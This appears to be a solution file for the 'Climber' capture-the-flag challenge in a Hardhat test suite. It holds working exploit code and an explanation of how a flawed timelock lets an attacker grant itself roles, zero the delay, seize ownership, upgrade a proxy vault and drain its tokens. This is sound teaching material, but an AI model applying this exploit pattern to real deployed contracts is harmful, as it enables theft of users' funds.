const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
const { getContractAddress } = require('ethers/lib/utils');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);

        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');

        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const proposerRole = "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1";
        const attacker = await (await ethers.getContractFactory('ClimberVaultAttack', player)).deploy(
            timelock.address, vault.address
        );
        const targets = [timelock.address, timelock.address, vault.address, attacker.address];
        const values = [0, 0, 0, 0];
        const salt = "0x" + "0".repeat(64)
        const dataElements = [
            timelock.interface.encodeFunctionData('grantRole', [proposerRole, attacker.address]),
            timelock.interface.encodeFunctionData('updateDelay', [0]),
            vault.interface.encodeFunctionData('transferOwnership', [player.address]),
            attacker.interface.encodeFunctionData('scheduleCalls'),
        ];

        await timelock.connect(player).execute(
            targets,
            values,
            dataElements,
            salt
        );

        upgradedClimberVault = await upgrades.upgradeProxy(
            vault.address,
            await ethers.getContractFactory("ClimberVaultAttackUpgrade", player),
        );

        await upgradedClimberVault.connect(player).sweepFunds(token.address);

        /*
        Explanation:
        The Timelock contract allows anything to be executed and only later checks if the action was scheduled,
        reverting otherwise. The trick here is to execute the actions you need and then manipulate the schedule
        storage such that the checker thinks the action was previously scheduled.

        But how?
        If we perform action x, then schedule x, the executed operation will be:
        [x, schedule x]
        And the scheduled operation will be just:
        [x]

        The hashes of these two operations differ, meaning the transaction reverts.

        The solution to this problem is to use an attacker contract which will hide the scheduling behind a function call.
        So we will perform action x, then action y.
        The timelock contract sees:
        [x, y]
        And y is a call that schedules(x, y).

        Therefore, the hashes of what was executed and what was scheduled match.

        So what actions do we execute:
            1. grant our attacker contract the proposer role
            2. set updateDelays to 0 such that a proposal can be scheduled and executed within the same transaction
            3. transfer ownership of the vault to ourselves so we can later upgrade it
            4. schedule all of the above (including this 4th action) to the schedules, not directly, but using an attacker contract.
        
        Later, we just upgrade the vault to another implementation in which we can sweep the funds.
        */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
